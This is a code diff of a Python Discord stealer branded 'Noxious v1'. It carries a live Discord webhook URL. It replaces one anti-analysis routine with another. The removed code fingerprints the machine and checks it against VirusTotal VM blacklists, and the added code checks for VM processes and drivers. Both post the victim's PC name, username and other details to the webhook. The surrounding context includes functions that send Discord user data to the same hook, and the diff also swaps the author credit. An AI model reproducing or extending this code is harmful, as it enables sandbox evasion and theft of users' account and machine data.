@@ -24,208 +24,52 @@ from PIL                import ImageGrab
 
 webhook = 'https://discord.com/api/webhooks/1239479003174141962/9Jr8voT_-CwhtwkpGCfgziwm11C4_l8MhWoTJxhsJxRDKKHu_HXgtADPIqxuvt4VkWtt'
 
-# IMPORTANT
-# THIS IS AN ANTI DEBUG MEASURE FOR VIRUS TOTAL 
-# SENDS AN EMBED TO THE PROVIDED WEBHOOK WITH THE INFORMATION OF THE MACHINE THAT THE MALWARE IS BEING
-# EXECUTED ON IF YOU DONT TRUST THIS THEN PLEASE DONT USE 
-# THE SRC CODE IS FROM THE FOLLOWING LINK BELOW
-# https://github.com/6nz/virustotal-vm-blacklist
-
-
-# When ever the main Blacklists are updated 
-# this feature will automatically update
-
-def getip():
-    ip = "None"
-    try:
-        ip = requests.get("https://api.ipify.org").text
-    except:
+def send_embed(embed):
+    payload = {"embeds": [embed]}
+    response = requests.post(webhook, json=payload)
+    if response.status_code != 200:
         pass
-    return ip
 
+def check_vm():
+    vm_processes = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmacthlp.exe", "vmsrvc.exe", "xenservice.exe"]
+    vm_drivers = ["VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmhgfs.sys", "vmxnet.sys", "vmmouse.sys", "vmci.sys", "vmx_svga.sys"]
+    detected_processes = [proc for proc in vm_processes if proc.lower() in os.popen("tasklist").read().lower()]
+    detected_drivers = [driver for driver in vm_drivers if os.path.exists(f"C:\\Windows\\System32\\drivers\\{driver}")]
 
-def get_guid():
+    return detected_processes, detected_drivers
+
+def check_registry_key(key):
     try:
-        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
-        key_value = winreg.OpenKey(reg_connection, r"SOFTWARE\Microsoft\Cryptography")
-        return winreg.QueryValueEx(key_value, "MachineGuid")[0]
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as reg_key:
+            return True
+    except FileNotFoundError:
+        return False
     except Exception as e:
-        pass
+        print(e)
+        return False
 
-
-def get_hwguid():
-    try:
-        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
-        key_value = winreg.OpenKey(reg_connection,
-                                   r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001")
-        return winreg.QueryValueEx(key_value, "HwProfileGuid")[0]
-    except Exception as e:
-        pass
-
-desktop_name = socket.gethostname()
-pc_name = os.getenv("UserName")
-ip = getip()
-serveruser = os.getenv("UserName")
-mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-computer = wmi.WMI()
-os_info = computer.Win32_OperatingSystem()[0]
-os_name = os_info.Name.encode('utf-8').split(b'|')[0]
-os_name = f'{os_name}'.replace('b', ' ').replace("'", " ")
-gpu = computer.Win32_VideoController()[0].Name
-currentplat = os_name
-hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
-current_baseboard_manufacturer = subprocess.check_output('wmic baseboard get manufacturer').decode().split('\n')[1].strip()
-current_diskdrive_serial = subprocess.check_output('wmic diskdrive get serialnumber').decode().split('\n')[1].strip()
-current_cpu_serial = subprocess.check_output('wmic cpu get serialnumber').decode().split('\n')[1].strip()
-current_bios_serial = subprocess.check_output('wmic bios get serialnumber').decode().split('\n')[1].strip()
-current_baseboard_serial = subprocess.check_output('wmic baseboard get serialnumber').decode().split('\n')[1].strip()
-hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
-pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
-pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
-iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
-maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
-gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
-platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
-bios_serial_list = requests.get(
-    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt')
-baseboardmanufacturerlist = requests.get(
-    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Manufacturer_List.txt')
-baseboardserial_list = requests.get(
-    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt')
-cpuserial_list = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt')
-diskdriveserial_list = requests.get(
-    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt')
-hwprofileguidlist = requests.get(
-    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt')
-machineguidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt')
-hwguid = f'{get_hwguid()}'.replace('{', ' ').replace('}', ' ')
-
-vt_payload = {
-    "embeds": [
-        {
-            "title": "Virus Total Scan Detected",
-            "description": f"IP Address: {ip}",
-            "color": 0xffffff,
-            "fields": [
-                {
-                    "name": "Desktop Name",
-                    "value": desktop_name,
-                    "inline": False
-                },
-                {
-                    "name": "PC Name",
-                    "value": pc_name,
-                    "inline": False
-                }
-            ],
-            "thumbnail": {
-                "url": "https://yt3.googleusercontent.com/ytc/AOPolaTkLuq-p3dtzwLmhVr6cnOYh6PihW76KSu_QYMJ=s900-c-k-c0x00ffffff-no-rj"
-            }
-        }
-    ],
-    "username": "Noxious Logs",
-    "avatar_url": "https://yt3.googleusercontent.com/ytc/AOPolaTkLuq-p3dtzwLmhVr6cnOYh6PihW76KSu_QYMJ=s900-c-k-c0x00ffffff-no-rj"
+pc_username = os.getlogin()
+pc_name = platform.node()
+platform_name = platform.system()
+detected_processes, detected_driver = check_vm()
+embed = {
+    "title": pc_username,
+    "color": 0x000000,
+    "author": {
+        "name": "Virtual Machine Detected / Virus Total Scan ",
+        "icon_url": "https://img.icons8.com/pastel-glyph/64/security-checked--v1.png"
+    },
+    "footer": {
+        "text": "VM Protection | https://github.com/resentful1"
+    },
+    "fields": [
+        {"name": "PC Information", "value": f"<a:egptick:798084594552537099> PC Name: `{pc_name}`\n<a:egptick:798084594552537099> Username: `{pc_username}`\n<a:egptick:798084594552537099> Platform: `{platform_name}`", "inline": False},
+        {"name": "Virtual Machine", "value": "True", "inline": False},
+        {"name": "Detected Processes", "value": "\n".join(detected_processes) if detected_processes else "None", "inline": False},
+        {"name": "Detected Drivers", "value": "\n".join(detected_driver) if detected_driver else "None", "inline": False}
+    ]
 }
-
-
-def virus_total_send():
-    response = requests.post(webhook, json=vt_payload)
-
-def listcheck():
-    try:
-        if hwid in hwidlist.text:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if serveruser in pcusernamelist.text:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if pc_name in pcnamelist.text:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if ip in iplist.text:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if mac in maclist.text:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if gpu in gpulist.text:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if current_diskdrive_serial in diskdriveserial_list:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if current_cpu_serial in cpuserial_list:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if current_baseboard_manufacturer in baseboardmanufacturerlist:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if current_bios_serial in bios_serial_list:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if current_baseboard_serial in baseboardserial_list:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if get_guid() in machineguidlist:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-
-    try:
-        if hwguid in hwprofileguidlist:
-            virus_total_send()
-            os._exit(1)
-    except:
-        os._exit(1)
-listcheck()
-
-
-####################### Code End ################################
+send_embed(embed)
 
 def sjik():
     pscript = os.path.abspath(sys.argv[0])
@@ -368,11 +212,11 @@ def get_nox():
                             "title": user_name,
                             "color": 0x000000,
                             "author": {
-                                "name": "Noxious v1 - Made by Resentful",
+                                "name": "Noxious v1 - Made by api",
                                 "icon_url": "https://cdn.discordapp.com/attachments/1229552814683062336/1236400257470959796/aliens.png?"
                             },
                             "footer": {
-                                "text": "Dev Veal | https://github.com/resentful1"
+                                "text": "Dev Veal | https://github.com/api1"
                             },
                             "fields": [
                                 {"name": "User ID", "value": user_id, "inline": True},
